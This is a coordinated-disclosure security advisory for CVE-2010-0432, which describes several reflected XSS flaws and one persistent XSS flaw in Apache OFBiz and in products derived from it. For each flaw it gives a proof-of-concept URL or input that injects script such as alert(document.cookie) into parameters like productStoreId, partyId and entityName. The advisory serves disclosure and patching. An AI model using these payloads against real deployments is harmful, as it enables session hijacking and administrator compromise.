Date published: 2010-04-13
Vendors contacted: Apache Software Foundation
Release mode: Coordinated release


2. *Vulnerability Information*

Class: Multiple Cross Site Scripting (XSS)
Remotely Exploitable: Yes
Locally Exploitable: Yes
CVE Name: CVE-2010-0432


3. *Software Description*

Apache Open For Business (Apache OFBiz) is a community-driven
Open Source Enterprise Resource Planning (ERP) system.
It provides a suite of enterprise applications that integrate
and automate many of the business processes of an enterprise.
Apache OFBiz is a foundation and starting point for reliable,
secure and scalable enterprise solutions.
OFBiz is an Apache Software Foundation top level project.


4. *Vulnerability Description*

Cross-Site Scripting attacks are a type of injection problem, in which
malicious scripts are injected into the otherwise benign and trusted web sites.
Cross-site scripting (XSS) attacks occur when an attacker uses a web
application to send malicious code, generally in the form of a browser side
script, to a different end user. Flaws that allow these attacks to succeed are
quite widespread and occur anywhere a web application uses input from a user
in the output it generates without validating or encoding it.

This vulnerability can be exploited to force a logged in Administrator
to run arbitrary SQL commands [3] or create a new user with Full Privileges [4].
You can find customized XSS PoC payloads here.

For additional information and a demonstrative video, please read [1] and [2].


5. *Vulnerable packages*

Products based on Apache OFBiz:
    - Opentaps Version <= 1.4
    - Neogia Version <=  1.0
    - Entente Oya Version <= 1.6

8. *Technical Description*

8.1 A Reflected Cross Site Scripting vulnerability was found in the
"productStoreId" variable within the 'Export Product Listing' section.
When rendering menu widget item links of type hidden-form, the hidden
input value attributes were not being html encoded. In many cases these
hidden input values are derived from request parameters and could be used
in a Reflected Cross-Site Scripting attack.

For a page that contains a menu widget with the following menu item definition:
<menu-item name="ebayExportAllCategoryToEbayStore" title="${uiLabelMap.EbayExportAllCategoryToEbayStore}">
  <link target="exportCategoryEbayStore">
    <parameter param-name="productStoreId" value="${parameters.productStoreId}"/>
  </link>
</menu-item>

The vulnerability can be triggered by clicking on the
following URL:

https://www.ofbiz-example.com/ebaystore/control/exportProductListing?productStoreId=90100"
style="width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px"
onMouseOver="alert(document.cookie)


8.2 A Reflected Cross Site Scripting vulnerability was found in the
"partyId" variable within the 'View Profile' section.
This is because the application does not properly sanitise
the users input. The vulnerability can be triggered by clicking on the
following URL:

https://www.ofbiz-example.com/partymgr/control/viewprofile?&partyId=aa"
style="width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px"
onMouseOver="alert(document.cookie)

https://www.neogia-example.com/partymgr/control/login;partyId=aa"
style="width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px"
onMouseOver="alert(document.cookie)

https://www.opentaps-example.com/partymgr/control/viewprofile?partyId=aa"
style="width:100%25;height:100%25;display:block;position:absolute;top:0px;left:0px"
onMouseOver="alert(document.cookie)


8.3 A Reflected Cross Site Scripting vulnerability was found in the
"start" variable within the 'Show Portal Page' section.
During page rendering, if a FreeMarker TemplateException is thrown
then the stack trace is printed directly into the response and the
exception messages may contain un-sanitized user input which can expose
a Reflected Cross-Site Scripting vulnerability.

For any page rendered via a FreeMarker template that contains:
${screens.render(screenLocation, screenName)}
(or a similar screens.render(â€¦) call)

The vulnerability can be triggered by clicking on the
following URL:

https://www.ofbiz-example.com/myportal/control/showPortalPage?period=week
&start=1266796800000\<script>alert(document.cookie)</script>


8.4 A 404-based Reflected Cross Site Scripting vulnerability was found
on the whole application.
When using the ControlServlet, if an invalid request URI is supplied then
the 404 error page displays the requested URI without first sanitizing it.
The vulnerability can be triggered by clicking on the
following URL:

https://www.ofbiz-example.com/facility/control/ReceiveReturn"<b><body onLoad="alert(document.cookie)"><br><div>><!--

https://www.neogia-example.com/facility/control/ReceiveReturn"<b><body onLoad="alert(document.cookie)"><br><div>><!--

http://www.opentaps-example.com/crmsfa/control/ReceiveReturn"<b><body onLoad="alert(document.cookie)"><br><div>><!--

https://www.ententeoya-example.com/cms/control/ReceiveReturn"<b><body onLoad="alert(document.cookie)"><br><div>><!--


8.5 A  Reflected Cross Site Scripting vulnerability was found
on the ecommerce section specifically in the 'entityName' variable.
The vulnerability can be triggered by clicking on the
following URL:

http://www.ofbiz-example.com/ecommerce/control/ViewBlogArticle?contentId=BLG10000\<script>
alert(document.cookie)</script>&blogContentId=BLOGROOTBIGAL

http://www.opentaps-example.com/ecommerce/control/ViewBlogArticle?contentId=BLG10000\<script>
alert(document.cookie)</script>&blogContentId=BLOGROOTBIGAL


8.6 A Reflected Cross Site Scripting vulnerability was found in the
"entityName" variable within the 'Web Tools' section.
This is because the application fails to correctly sanitize
multiple form widget controls data before rendering it.
The vulnerability can be triggered by clicking on the
following URL:

https://www.ofbiz-example.com/webtools/control/FindGeneric?entityName=AccommodationClass\<script>
alert(document.cookie)</script>&find=true&VIEW_SIZE=50&VIEW_INDEX=0

8.7 A Persistant Cross Site Scripting vulnerability was found in almost
every user controlled parameters within the application.
This is because the application does not properly sanitise
the users input. An example of this vulnerability can be triggered by
following these steps.

i) A logged in user sends the following string on 'subject' or 'content'
parameters within the 'ecommerce/control/contactus' section.

<script>alert(document.cookie)</script>

ii) A logged in Administrator browses 'Other Party Comms' section.

iii) The browser executes the JavaScript on every future Other Party Comms load.
